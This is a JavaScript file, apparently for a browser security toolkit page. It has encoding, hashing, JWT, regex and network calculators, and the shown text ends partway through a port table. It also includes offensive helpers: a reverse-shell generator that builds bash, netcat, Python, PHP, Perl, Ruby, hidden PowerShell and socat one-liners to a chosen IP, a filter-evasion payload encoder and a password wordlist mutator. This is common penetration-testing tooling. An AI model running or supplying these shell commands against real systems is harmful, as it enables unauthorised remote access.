(function () {
  "use strict";

  function $(id) { return document.getElementById(id); }

  function bytesToHex(bytes) {
    return Array.prototype.map.call(bytes, function (b) {
      return b.toString(16).padStart(2, "0");
    }).join("");
  }

  function hexToBytes(hex) {
    hex = hex.replace(/\s+/g, "");
    if (hex.length % 2) hex = "0" + hex;
    var out = new Uint8Array(hex.length / 2);
    for (var i = 0; i < out.length; i++) out[i] = parseInt(hex.substr(i * 2, 2), 16);
    return out;
  }

  function strToUtf8Bytes(s) {
    return new TextEncoder().encode(s);
  }

  function bytesToStr(bytes) {
    return new TextDecoder("utf-8", { fatal: false }).decode(bytes);
  }

  function copyToClipboard(text, btn) {
    function flash() {
      if (btn) {
        var orig = btn.textContent;
        btn.textContent = "copied";
        setTimeout(function () { btn.textContent = orig; }, 1200);
      }
    }
    // navigator.clipboard only exists in a secure context (HTTPS or
    // localhost) -- falls back to the old execCommand trick on plain
    // HTTP hosts (e.g. the arch staging box) where it's undefined.
    if (navigator.clipboard && navigator.clipboard.writeText) {
      navigator.clipboard.writeText(text).then(flash).catch(function () {
        legacyCopy(text, flash);
      });
    } else {
      legacyCopy(text, flash);
    }
  }

  function legacyCopy(text, onSuccess) {
    var ta = document.createElement("textarea");
    ta.value = text;
    ta.style.position = "fixed";
    ta.style.opacity = "0";
    document.body.appendChild(ta);
    ta.focus();
    ta.select();
    try {
      if (document.execCommand("copy") && onSuccess) onSuccess();
    } catch (e) {}
    document.body.removeChild(ta);
  }

  function wireCopy(btnId, sourceId) {
    var btn = $(btnId);
    if (!btn) return;
    btn.addEventListener("click", function () {
      var el = $(sourceId);
      copyToClipboard(el.value !== undefined ? el.value : el.textContent, btn);
    });
  }

  // ---------------------------------------------------------------------
  // MD5 (Paul Johnston / RSA reference algorithm, public domain derivative)
  // ---------------------------------------------------------------------
  function md5(input) {
    function rotl(x, c) { return (x << c) | (x >>> (32 - c)); }
    function addU(x, y) {
      var lsw = (x & 0xffff) + (y & 0xffff);
      var msw = (x >> 16) + (y >> 16) + (lsw >> 16);
      return (msw << 16) | (lsw & 0xffff);
    }
    function F(x, y, z) { return (x & y) | (~x & z); }
    function G(x, y, z) { return (x & z) | (y & ~z); }
    function H(x, y, z) { return x ^ y ^ z; }
    function I(x, y, z) { return y ^ (x | ~z); }
    function cmn(q, a, b, x, s, t) {
      return addU(rotl(addU(addU(a, q), addU(x, t)), s), b);
    }
    function ff(a, b, c, d, x, s, t) { return cmn(F(b, c, d), a, b, x, s, t); }
    function gg(a, b, c, d, x, s, t) { return cmn(G(b, c, d), a, b, x, s, t); }
    function hh(a, b, c, d, x, s, t) { return cmn(H(b, c, d), a, b, x, s, t); }
    function ii(a, b, c, d, x, s, t) { return cmn(I(b, c, d), a, b, x, s, t); }

    var bytes = strToUtf8Bytes(input);
    var origLenBits = bytes.length * 8;
    var withPad = bytes.length + 1;
    while (withPad % 64 !== 56) withPad++;
    var buf = new Uint8Array(withPad + 8);
    buf.set(bytes);
    buf[bytes.length] = 0x80;
    var dv = new DataView(buf.buffer);
    dv.setUint32(withPad, origLenBits >>> 0, true);
    dv.setUint32(withPad + 4, Math.floor(origLenBits / 4294967296), true);

    var a = 1732584193, b = -271733879, c = -1732584194, d = 271733878;

    for (var off = 0; off < buf.length; off += 64) {
      var x = new Array(16);
      for (var j = 0; j < 16; j++) x[j] = dv.getUint32(off + j * 4, true);
      var oa = a, ob = b, oc = c, od = d;

      a = ff(a, b, c, d, x[0], 7, -680876936); d = ff(d, a, b, c, x[1], 12, -389564586);
      c = ff(c, d, a, b, x[2], 17, 606105819); b = ff(b, c, d, a, x[3], 22, -1044525330);
      a = ff(a, b, c, d, x[4], 7, -176418897); d = ff(d, a, b, c, x[5], 12, 1200080426);
      c = ff(c, d, a, b, x[6], 17, -1473231341); b = ff(b, c, d, a, x[7], 22, -45705983);
      a = ff(a, b, c, d, x[8], 7, 1770035416); d = ff(d, a, b, c, x[9], 12, -1958414417);
      c = ff(c, d, a, b, x[10], 17, -42063); b = ff(b, c, d, a, x[11], 22, -1990404162);
      a = ff(a, b, c, d, x[12], 7, 1804603682); d = ff(d, a, b, c, x[13], 12, -40341101);
      c = ff(c, d, a, b, x[14], 17, -1502002290); b = ff(b, c, d, a, x[15], 22, 1236535329);

      a = gg(a, b, c, d, x[1], 5, -165796510); d = gg(d, a, b, c, x[6], 9, -1069501632);
      c = gg(c, d, a, b, x[11], 14, 643717713); b = gg(b, c, d, a, x[0], 20, -373897302);
      a = gg(a, b, c, d, x[5], 5, -701558691); d = gg(d, a, b, c, x[10], 9, 38016083);
      c = gg(c, d, a, b, x[15], 14, -660478335); b = gg(b, c, d, a, x[4], 20, -405537848);
      a = gg(a, b, c, d, x[9], 5, 568446438); d = gg(d, a, b, c, x[14], 9, -1019803690);
      c = gg(c, d, a, b, x[3], 14, -187363961); b = gg(b, c, d, a, x[8], 20, 1163531501);
      a = gg(a, b, c, d, x[13], 5, -1444681467); d = gg(d, a, b, c, x[2], 9, -51403784);
      c = gg(c, d, a, b, x[7], 14, 1735328473); b = gg(b, c, d, a, x[12], 20, -1926607734);

      a = hh(a, b, c, d, x[5], 4, -378558); d = hh(d, a, b, c, x[8], 11, -2022574463);
      c = hh(c, d, a, b, x[11], 16, 1839030562); b = hh(b, c, d, a, x[14], 23, -35309556);
      a = hh(a, b, c, d, x[1], 4, -1530992060); d = hh(d, a, b, c, x[4], 11, 1272893353);
      c = hh(c, d, a, b, x[7], 16, -155497632); b = hh(b, c, d, a, x[10], 23, -1094730640);
      a = hh(a, b, c, d, x[13], 4, 681279174); d = hh(d, a, b, c, x[0], 11, -358537222);
      c = hh(c, d, a, b, x[3], 16, -722521979); b = hh(b, c, d, a, x[6], 23, 76029189);
      a = hh(a, b, c, d, x[9], 4, -640364487); d = hh(d, a, b, c, x[12], 11, -421815835);
      c = hh(c, d, a, b, x[15], 16, 530742520); b = hh(b, c, d, a, x[2], 23, -995338651);

      a = ii(a, b, c, d, x[0], 6, -198630844); d = ii(d, a, b, c, x[7], 10, 1126891415);
      c = ii(c, d, a, b, x[14], 15, -1416354905); b = ii(b, c, d, a, x[5], 21, -57434055);
      a = ii(a, b, c, d, x[12], 6, 1700485571); d = ii(d, a, b, c, x[3], 10, -1894986606);
      c = ii(c, d, a, b, x[10], 15, -1051523); b = ii(b, c, d, a, x[1], 21, -2054922799);
      a = ii(a, b, c, d, x[8], 6, 1873313359); d = ii(d, a, b, c, x[15], 10, -30611744);
      c = ii(c, d, a, b, x[6], 15, -1560198380); b = ii(b, c, d, a, x[13], 21, 1309151649);
      a = ii(a, b, c, d, x[4], 6, -145523070); d = ii(d, a, b, c, x[11], 10, -1120210379);
      c = ii(c, d, a, b, x[2], 15, 718787259); b = ii(b, c, d, a, x[9], 21, -343485551);

      a = addU(a, oa); b = addU(b, ob); c = addU(c, oc); d = addU(d, od);
    }

    function le(n) {
      var s = "";
      for (var i = 0; i < 4; i++) {
        s += ((n >> (i * 8)) & 0xff).toString(16).padStart(2, "0");
      }
      return s;
    }
    return le(a) + le(b) + le(c) + le(d);
  }

  async function subtleHash(algo, str) {
    var buf = await crypto.subtle.digest(algo, strToUtf8Bytes(str));
    return bytesToHex(new Uint8Array(buf));
  }

  // ---------------------------------------------------------------------
  // Base32 (RFC 4648)
  // ---------------------------------------------------------------------
  var B32_ALPHABET = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
  function base32Encode(bytes) {
    var bits = "", out = "";
    for (var i = 0; i < bytes.length; i++) bits += bytes[i].toString(2).padStart(8, "0");
    for (i = 0; i < bits.length; i += 5) {
      var chunk = bits.substr(i, 5);
      if (chunk.length < 5) chunk = chunk.padEnd(5, "0");
      out += B32_ALPHABET[parseInt(chunk, 2)];
    }
    while (out.length % 8 !== 0) out += "=";
    return out;
  }
  function base32Decode(str) {
    str = str.toUpperCase().replace(/=+$/, "");
    var bits = "";
    for (var i = 0; i < str.length; i++) {
      var val = B32_ALPHABET.indexOf(str[i]);
      if (val === -1) continue;
      bits += val.toString(2).padStart(5, "0");
    }
    var bytes = [];
    for (i = 0; i + 8 <= bits.length; i += 8) bytes.push(parseInt(bits.substr(i, 8), 2));
    return new Uint8Array(bytes);
  }

  // ---------------------------------------------------------------------
  // 1. Encoder / Decoder
  // ---------------------------------------------------------------------
  function initEncoder() {
    var mode = $("enc-mode"), shift = $("enc-shift"), input = $("enc-input"), output = $("enc-output");
    if (!mode) return;

    mode.addEventListener("change", function () {
      shift.style.display = mode.value === "rot13" ? "inline-block" : "none";
    });

    function run(direction) {
      var val = input.value;
      var m = mode.value;
      try {
        if (m === "base64") {
          output.value = direction === "encode"
            ? btoa(unescape(encodeURIComponent(val)))
            : decodeURIComponent(escape(atob(val.trim())));
        } else if (m === "base32") {
          output.value = direction === "encode"
            ? base32Encode(strToUtf8Bytes(val))
            : bytesToStr(base32Decode(val.trim()));
        } else if (m === "url") {
          output.value = direction === "encode" ? encodeURIComponent(val) : decodeURIComponent(val);
        } else if (m === "html") {
          if (direction === "encode") {
            var d = document.createElement("div");
            d.textContent = val;
            output.value = d.innerHTML;
          } else {
            var ta = document.createElement("textarea");
            ta.innerHTML = val;
            output.value = ta.value;
          }
        } else if (m === "hex") {
          output.value = direction === "encode"
            ? bytesToHex(strToUtf8Bytes(val))
            : bytesToStr(hexToBytes(val));
        } else if (m === "binary") {
          if (direction === "encode") {
            output.value = Array.prototype.map.call(strToUtf8Bytes(val), function (b) {
              return b.toString(2).padStart(8, "0");
            }).join(" ");
          } else {
            var bytes = val.trim().split(/\s+/).map(function (b) { return parseInt(b, 2); });
            output.value = bytesToStr(new Uint8Array(bytes));
          }
        } else if (m === "rot13") {
          var n = parseInt(shift.value, 10);
          if (isNaN(n)) n = 13;
          if (direction === "decode") n = 26 - (((n % 26) + 26) % 26);
          output.value = val.replace(/[a-zA-Z]/g, function (ch) {
            var base = ch <= "Z" ? 65 : 97;
            return String.fromCharCode(((ch.charCodeAt(0) - base + n) % 26 + 26) % 26 + base);
          });
        }
      } catch (e) {
        output.value = "error: " + e.message;
      }
    }
    $("enc-encode-btn").addEventListener("click", function () { run("encode"); });
    $("enc-decode-btn").addEventListener("click", function () { run("decode"); });
    wireCopy("enc-copy-btn", "enc-output");
  }

  // ---------------------------------------------------------------------
  // 2. Hash generator
  // ---------------------------------------------------------------------
  function initHasher() {
    var btn = $("hash-btn");
    if (!btn) return;
    var subtleOk = !!(window.crypto && window.crypto.subtle);
    btn.addEventListener("click", async function () {
      var val = $("hash-input").value;
      var out = $("hash-output");
      out.textContent = "hashing...";
      var lines = [];
      lines.push("md5    " + md5(val));
      if (subtleOk) {
        try {
          lines.push("sha-1  " + await subtleHash("SHA-1", val));
          lines.push("sha-256 " + await subtleHash("SHA-256", val));
          lines.push("sha-384 " + await subtleHash("SHA-384", val));
          lines.push("sha-512 " + await subtleHash("SHA-512", val));
        } catch (e) {
          lines.push("(sha-* failed: " + e.message + ")");
        }
      } else {
        lines.push("(sha-1/256/384/512 need a secure context -- https or localhost. works on the live site.)");
      }
      out.textContent = lines.join("\n");
    });
    wireCopy("hash-copy-btn", "hash-output");
  }

  // ---------------------------------------------------------------------
  // 3. HMAC generator
  // ---------------------------------------------------------------------
  function initHmac() {
    var btn = $("hmac-btn");
    if (!btn) return;
    btn.addEventListener("click", async function () {
      var msg = $("hmac-msg").value;
      var key = $("hmac-key").value;
      var algo = $("hmac-algo").value;
      var out = $("hmac-output");
      if (!(window.crypto && window.crypto.subtle)) {
        out.textContent = "HMAC needs a secure context -- https or localhost. works on the live site.";
        return;
      }
      try {
        var cryptoKey = await crypto.subtle.importKey(
          "raw", strToUtf8Bytes(key), { name: "HMAC", hash: algo }, false, ["sign"]
        );
        var sig = await crypto.subtle.sign("HMAC", cryptoKey, strToUtf8Bytes(msg));
        out.textContent = bytesToHex(new Uint8Array(sig));
      } catch (e) {
        out.textContent = "error: " + e.message;
      }
    });
    wireCopy("hmac-copy-btn", "hmac-output");
  }

  // ---------------------------------------------------------------------
  // 4. Hash identifier
  // ---------------------------------------------------------------------
  function initHashId() {
    var btn = $("hashid-btn");
    if (!btn) return;
    btn.addEventListener("click", function () {
      var val = $("hashid-input").value.trim();
      var out = $("hashid-output");
      var guesses = [];
      var isHex = /^[a-fA-F0-9]+$/.test(val);
      var len = val.length;
      if (val.startsWith("$2a$") || val.startsWith("$2b$") || val.startsWith("$2y$")) guesses.push("bcrypt");
      if (val.startsWith("$1$")) guesses.push("md5crypt");
      if (val.startsWith("$6$")) guesses.push("sha512crypt");
      if (val.startsWith("$argon2")) guesses.push("argon2");
      if (isHex) {
        if (len === 32) guesses.push("MD5", "NTLM", "MD4", "LM (unlikely, no dashes)");
        if (len === 40) guesses.push("SHA-1", "RIPEMD-160");
        if (len === 56) guesses.push("SHA-224");
        if (len === 64) guesses.push("SHA-256");
        if (len === 96) guesses.push("SHA-384");
        if (len === 128) guesses.push("SHA-512");
        if (len === 8) guesses.push("CRC32");
      }
      if (/^[A-Za-z0-9+/]+={0,2}$/.test(val) && !isHex) {
        guesses.push("possible base64-encoded hash (decode length: " + Math.floor(len * 3 / 4) + " bytes)");
      }
      out.textContent = guesses.length ? guesses.join("\n") : "no confident match — length " + len + (isHex ? " (hex)" : " (non-hex)");
    });
  }

  // ---------------------------------------------------------------------
  // 5. JWT decoder
  // ---------------------------------------------------------------------
  function b64urlDecode(s) {
    s = s.replace(/-/g, "+").replace(/_/g, "/");
    while (s.length % 4) s += "=";
    return decodeURIComponent(escape(atob(s)));
  }
  function initJwt() {
    var btn = $("jwt-btn");
    if (!btn) return;
    btn.addEventListener("click", function () {
      var token = $("jwt-input").value.trim();
      var out = $("jwt-output");
      var parts = token.split(".");
      if (parts.length < 2) { out.textContent = "not a JWT (expected header.payload.signature)"; return; }
      try {
        var header = JSON.stringify(JSON.parse(b64urlDecode(parts[0])), null, 2);
        var payload = JSON.stringify(JSON.parse(b64urlDecode(parts[1])), null, 2);
        var sig = parts[2] || "(none)";
        out.textContent = "header:\n" + header + "\n\npayload:\n" + payload + "\n\nsignature (raw, unverified):\n" + sig;
      } catch (e) {
        out.textContent = "error decoding: " + e.message;
      }
    });
  }

  // ---------------------------------------------------------------------
  // 6. XOR cipher
  // ---------------------------------------------------------------------
  function initXor() {
    var btn = $("xor-btn");
    if (!btn) return;
    btn.addEventListener("click", function () {
      var input = $("xor-input").value;
      var key = $("xor-key").value;
      var mode = $("xor-mode").value;
      var out = $("xor-output");
      if (!key) { out.textContent = "key required"; return; }
      var keyBytes = strToUtf8Bytes(key);
      var dataBytes = mode === "encode" ? strToUtf8Bytes(input) : hexToBytes(input.trim());
      var result = new Uint8Array(dataBytes.length);
      for (var i = 0; i < dataBytes.length; i++) result[i] = dataBytes[i] ^ keyBytes[i % keyBytes.length];
      out.textContent = mode === "encode" ? bytesToHex(result) : bytesToStr(result);
    });
  }

  // ---------------------------------------------------------------------
  // 7. Regex tester
  // ---------------------------------------------------------------------
  var REGEX_PRESETS = {
    email: "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}",
    ipv4: "\\b(?:\\d{1,3}\\.){3}\\d{1,3}\\b",
    url: "https?:\\/\\/[^\\s]+",
    mac: "([0-9A-Fa-f]{2}[:-]){5}[0-9A-Fa-f]{2}",
    subdomain: "[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\\.[a-zA-Z]{2,}"
  };
  function initRegex() {
    var presetSel = $("regex-preset");
    if (!presetSel) return;
    presetSel.addEventListener("change", function () {
      if (REGEX_PRESETS[presetSel.value]) $("regex-pattern").value = REGEX_PRESETS[presetSel.value];
    });
    $("regex-btn").addEventListener("click", function () {
      var pattern = $("regex-pattern").value;
      var flags = $("regex-flags").value || "g";
      var text = $("regex-text").value;
      var highlighted = $("regex-highlighted");
      var groups = $("regex-groups");
      try {
        if (flags.indexOf("g") === -1) flags += "g";
        var re = new RegExp(pattern, flags);
        var matches = Array.from(text.matchAll(re));
        var lastIndex = 0, html = "";
        matches.forEach(function (m) {
          html += escapeHtml(text.slice(lastIndex, m.index)) + "<mark>" + escapeHtml(m[0]) + "</mark>";
          lastIndex = m.index + m[0].length;
        });
        html += escapeHtml(text.slice(lastIndex));
        highlighted.innerHTML = html || "(empty input)";
        groups.textContent = matches.length
          ? matches.map(function (m, i) { return "match " + (i + 1) + ": " + JSON.stringify(m.slice(1)); }).join("\n")
          : "no matches";
      } catch (e) {
        highlighted.textContent = "";
        groups.textContent = "error: " + e.message;
      }
    });
  }
  function escapeHtml(s) {
    return s.replace(/[&<>"']/g, function (c) {
      return { "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c];
    });
  }

  // ---------------------------------------------------------------------
  // 8. CIDR / subnet calculator
  // ---------------------------------------------------------------------
  function ipToInt(ip) {
    var parts = ip.split(".").map(Number);
    if (parts.length !== 4 || parts.some(function (p) { return isNaN(p) || p < 0 || p > 255; })) return null;
    return ((parts[0] << 24) | (parts[1] << 16) | (parts[2] << 8) | parts[3]) >>> 0;
  }
  function intToIp(n) {
    return [(n >>> 24) & 255, (n >>> 16) & 255, (n >>> 8) & 255, n & 255].join(".");
  }
  function initCidr() {
    var btn = $("cidr-btn");
    if (!btn) return;
    btn.addEventListener("click", function () {
      var val = $("cidr-input").value.trim();
      var out = $("cidr-output");
      var m = val.match(/^(\d+\.\d+\.\d+\.\d+)\/(\d{1,2})$/);
      if (!m) { out.textContent = "expected format: 192.168.1.0/24"; return; }
      var ip = ipToInt(m[1]);
      var prefix = parseInt(m[2], 10);
      if (ip === null || prefix < 0 || prefix > 32) { out.textContent = "invalid input"; return; }
      var mask = prefix === 0 ? 0 : (0xFFFFFFFF << (32 - prefix)) >>> 0;
      var network = (ip & mask) >>> 0;
      var broadcast = (network | (~mask >>> 0)) >>> 0;
      var wildcard = (~mask) >>> 0;
      var total = Math.pow(2, 32 - prefix);
      var usableFirst = prefix >= 31 ? network : network + 1;
      var usableLast = prefix >= 31 ? broadcast : broadcast - 1;
      out.textContent = [
        "network:    " + intToIp(network) + "/" + prefix,
        "netmask:    " + intToIp(mask),
        "wildcard:   " + intToIp(wildcard),
        "broadcast:  " + intToIp(broadcast),
        "hosts:      " + (prefix >= 31 ? total : Math.max(total - 2, 0)) + " usable (" + total + " total)",
        "range:      " + intToIp(usableFirst) + " - " + intToIp(usableLast)
      ].join("\n");
    });
  }

  // ---------------------------------------------------------------------
  // 9. IP converter
  // ---------------------------------------------------------------------
  function initIpConv() {
    var btn = $("ipconv-btn");
    if (!btn) return;
    btn.addEventListener("click", function () {
      var val = $("ipconv-input").value.trim();
      var out = $("ipconv-output");
      var n;
      if (/^\d+\.\d+\.\d+\.\d+$/.test(val)) {
        n = ipToInt(val);
        if (n === null) { out.textContent = "invalid IPv4"; return; }
      } else if (/^0x[0-9a-fA-F]+$/.test(val)) {
        n = parseInt(val, 16) >>> 0;
      } else if (/^\d+$/.test(val)) {
        n = parseInt(val, 10) >>> 0;
      } else {
        out.textContent = "enter a dotted IPv4, decimal uint32, or 0x-hex value";
        return;
      }
      out.textContent = [
        "dotted:  " + intToIp(n),
        "decimal: " + n,
        "hex:     0x" + n.toString(16).padStart(8, "0"),
        "binary:  " + n.toString(2).padStart(32, "0").match(/.{8}/g).join(".")
      ].join("\n");
    });
  }

  // ---------------------------------------------------------------------
  // 10. User-Agent parser
  // ---------------------------------------------------------------------
  function initUaParser() {
    var btn = $("ua-btn");
    if (!btn) return;
    $("ua-mine-btn").addEventListener("click", function () {
      $("ua-input").value = navigator.userAgent;
    });
    btn.addEventListener("click", function () {
      var ua = $("ua-input").value.trim();
      var out = $("ua-output");
      if (!ua) { out.textContent = "paste a User-Agent string"; return; }
      var browser = "unknown", version = "?";
      var browserChecks = [
        [/Edg\/([\d.]+)/, "Edge"], [/OPR\/([\d.]+)/, "Opera"],
        [/Chrome\/([\d.]+)/, "Chrome"], [/Firefox\/([\d.]+)/, "Firefox"],
        [/Version\/([\d.]+).*Safari/, "Safari"], [/MSIE ([\d.]+)/, "IE"],
        [/Trident.*rv:([\d.]+)/, "IE"]
      ];
      for (var i = 0; i < browserChecks.length; i++) {
        var m = ua.match(browserChecks[i][0]);
        if (m) { browser = browserChecks[i][1]; version = m[1]; break; }
      }
      var os = "unknown";
      var osChecks = [
        [/Windows NT 10\.0/, "Windows 10/11"], [/Windows NT 6\.3/, "Windows 8.1"],
        [/Windows NT 6\.1/, "Windows 7"], [/Mac OS X ([\d_]+)/, "macOS"],
        [/Android ([\d.]+)/, "Android"], [/iPhone OS ([\d_]+)/, "iOS"],
        [/CrOS/, "ChromeOS"], [/Linux/, "Linux"]
      ];
      for (i = 0; i < osChecks.length; i++) {
        var om = ua.match(osChecks[i][0]);
        if (om) { os = osChecks[i][1] + (om[1] ? " " + om[1].replace(/_/g, ".") : ""); break; }
      }
      var engine = /Gecko\//.test(ua) && /Firefox/.test(ua) ? "Gecko"
        : /AppleWebKit/.test(ua) ? "WebKit/Blink" : "unknown";
      var mobile = /Mobi|Android|iPhone/.test(ua) ? "yes" : "no";
      out.textContent = [
        "browser: " + browser + " " + version,
        "os:      " + os,
        "engine:  " + engine,
        "mobile:  " + mobile
      ].join("\n");
    });
  }

  // ---------------------------------------------------------------------
  // 11. Reverse shell generator
  // ---------------------------------------------------------------------
  function initRevshell() {
    var btn = $("revshell-btn");
    if (!btn) return;
    btn.addEventListener("click", function () {
      var ip = $("revshell-ip").value.trim() || "IP";
      var port = $("revshell-port").value.trim() || "PORT";
      var out = $("revshell-output");
      var shells = {
        "bash -i": "bash -i >& /dev/tcp/" + ip + "/" + port + " 0>&1",
        "bash -c": "0<&196;exec 196<>/dev/tcp/" + ip + "/" + port + "; sh <&196 >&196 2>&196",
        "nc -e": "nc -e /bin/sh " + ip + " " + port,
        "nc mkfifo": "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " + ip + " " + port + " >/tmp/f",
        "python3": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + ip + "\"," + port + "));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/sh\")'",
        "python2": "python2 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + ip + "\"," + port + "));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
        "php": "php -r '$sock=fsockopen(\"" + ip + "\"," + port + ");exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "perl": "perl -e 'use Socket;$i=\"" + ip + "\";$p=" + port + ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
        "ruby": "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"" + ip + "\"," + port + ");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'",
        "powershell": "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$c=New-Object System.Net.Sockets.TCPClient('" + ip + "'," + port + ");$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()\"",
        "socat": "socat TCP:" + ip + ":" + port + " EXEC:/bin/sh,pty,stderr,setsid,sigint,sane",
        "listener (attacker side)": "nc -lvnp " + port
      };
      out.textContent = Object.keys(shells).map(function (k) { return "# " + k + "\n" + shells[k]; }).join("\n\n");
    });
  }

  // ---------------------------------------------------------------------
  // 12. Payload encoder
  // ---------------------------------------------------------------------
  function initPayloadEncoder() {
    var btn = $("payload-btn");
    if (!btn) return;
    btn.addEventListener("click", function () {
      var val = $("payload-input").value;
      var out = $("payload-output");
      var urlEnc = encodeURIComponent(val);
      var doubleUrlEnc = encodeURIComponent(urlEnc);
      var htmlEnc = val.replace(/[\s\S]/g, function (c) { return "&#" + c.charCodeAt(0) + ";"; });
      var unicodeEsc = val.replace(/[\s\S]/g, function (c) {
        return "\\u" + c.charCodeAt(0).toString(16).padStart(4, "0");
      });
      var b64 = btoa(unescape(encodeURIComponent(val)));
      var caseRandom = val.split("").map(function (c) {
        return Math.random() > 0.5 ? c.toUpperCase() : c.toLowerCase();
      }).join("");
      out.textContent = [
        "url-encoded:        " + urlEnc,
        "double url-encoded: " + doubleUrlEnc,
        "html-entity:        " + htmlEnc,
        "unicode-escaped:    " + unicodeEsc,
        "base64:             " + b64,
        "case-randomized:    " + caseRandom
      ].join("\n\n");
    });
  }

  // ---------------------------------------------------------------------
  // 13. Password strength / entropy
  // ---------------------------------------------------------------------
  function initPassStrength() {
    var input = $("pass-input");
    if (!input) return;
    input.addEventListener("input", function () {
      var val = input.value;
      var out = $("pass-output");
      if (!val) { out.textContent = ""; return; }
      var charset = 0;
      if (/[a-z]/.test(val)) charset += 26;
      if (/[A-Z]/.test(val)) charset += 26;
      if (/[0-9]/.test(val)) charset += 10;
      if (/[^a-zA-Z0-9]/.test(val)) charset += 33;
      var entropy = val.length * Math.log2(charset || 1);
      var offlineSec = Math.pow(2, entropy) / 1e10;
      var onlineSec = Math.pow(2, entropy) / 10;
      function fmtTime(s) {
        if (s < 1) return "instant";
        var units = [["yr", 31536000], ["day", 86400], ["hr", 3600], ["min", 60], ["sec", 1]];
        for (var i = 0; i < units.length; i++) {
          if (s >= units[i][1]) return (s / units[i][1]).toFixed(1) + " " + units[i][0] + (s / units[i][1] >= 1e6 ? " (effectively never)" : "");
        }
        return s.toFixed(1) + " sec";
      }
      out.textContent = [
        "length:        " + val.length,
        "charset size:  ~" + charset,
        "entropy:       " + entropy.toFixed(1) + " bits",
        "crack (offline, 10B guess/s): " + fmtTime(offlineSec),
        "crack (online, 10 guess/s):   " + fmtTime(onlineSec)
      ].join("\n");
    });
  }

  // ---------------------------------------------------------------------
  // 14. Wordlist mutator
  // ---------------------------------------------------------------------
  var LEET_MAP = { a: "4", e: "3", i: "1", o: "0", s: "5", t: "7" };
  function leetify(word) {
    return word.replace(/[aeiost]/gi, function (c) {
      var l = c.toLowerCase();
      return LEET_MAP[l] || c;
    });
  }
  function initWordlist() {
    var btn = $("wordlist-btn");
    if (!btn) return;
    btn.addEventListener("click", function () {
      var words = $("wordlist-input").value.split("\n").map(function (w) { return w.trim(); }).filter(Boolean);
      var doLeet = $("wordlist-leet").checked;
      var doNums = $("wordlist-nums").checked;
      var doYears = $("wordlist-years").checked;
      var doSymbols = $("wordlist-symbols").checked;
      var results = new Set();
      words.forEach(function (w) {
        var variants = [w, w.toLowerCase(), w.toUpperCase(), w.charAt(0).toUpperCase() + w.slice(1).toLowerCase()];
        if (doLeet) variants.push(leetify(w));
        variants.forEach(function (v) { results.add(v); });
      });
      var withSuffixes = new Set(results);
      results.forEach(function (v) {
        if (doNums) for (var n = 0; n <= 99; n++) withSuffixes.add(v + n);
        if (doYears) for (var y = 1990; y <= 2030; y++) withSuffixes.add(v + y);
        if (doSymbols) ["!", "@", "#", "123", "!23"].forEach(function (s) { withSuffixes.add(v + s); });
      });
      var out = $("wordlist-output");
      var list = Array.from(withSuffixes);
      out.value = list.join("\n");
      $("wordlist-count").textContent = list.length + " words generated";
      window.__wordlistBlob = list.join("\n");
    });
    $("wordlist-download-btn").addEventListener("click", function () {
      if (!window.__wordlistBlob) return;
      var blob = new Blob([window.__wordlistBlob], { type: "text/plain" });
      var a = document.createElement("a");
      a.href = URL.createObjectURL(blob);
      a.download = "wordlist.txt";
      a.click();
      URL.revokeObjectURL(a.href);
    });
  }

  // ---------------------------------------------------------------------
  // 15. Port lookup
  // ---------------------------------------------------------------------
  var PORTS = [
    [20, "tcp", "FTP data"], [21, "tcp", "FTP control"], [22, "tcp", "SSH"], [23, "tcp", "Telnet"],
    [25, "tcp", "SMTP"], [53, "tcp/udp", "DNS"], [67, "udp", "DHCP server"], [68, "udp", "DHCP client"],
    [69, "udp", "TFTP"], [80, "tcp", "HTTP"], [88, "tcp", "Kerberos"], [110, "tcp", "POP3"],
    [111, "tcp", "RPCbind"], [123, "udp", "NTP"], [135, "tcp", "MS RPC"], [137, "udp", "NetBIOS Name"],
    [138, "udp", "NetBIOS Datagram"], [139, "tcp", "NetBIOS Session"], [143, "tcp", "IMAP"],
    [161, "udp", "SNMP"], [162, "udp", "SNMP trap"], [179, "tcp", "BGP"], [389, "tcp", "LDAP"],
    [443, "tcp", "HTTPS"], [445, "tcp", "SMB"], [465, "tcp", "SMTPS"], [514, "udp", "syslog"],
    [515, "tcp", "LPD/printer"], [587, "tcp", "SMTP submission"], [593, "tcp", "MS RPC over HTTP"],
    [636, "tcp", "LDAPS"], [873, "tcp", "rsync"], [990, "tcp", "FTPS"], [993, "tcp", "IMAPS"],
    [995, "tcp", "POP3S"], [1080, "tcp", "SOCKS proxy"], [1194, "udp", "OpenVPN"],
    [1433, "tcp", "MSSQL"], [1521, "tcp", "Oracle DB"], [1723, "tcp", "PPTP"], [2049, "tcp", "NFS"],
    [2082, "tcp", "cPanel"], [2083, "tcp", "cPanel SSL"], [2181, "tcp", "Zookeeper"],
    [2375, "tcp", "Docker (unencrypted)"], [2376, "tcp", "Docker TLS"], [3128, "tcp", "Squid proxy"],
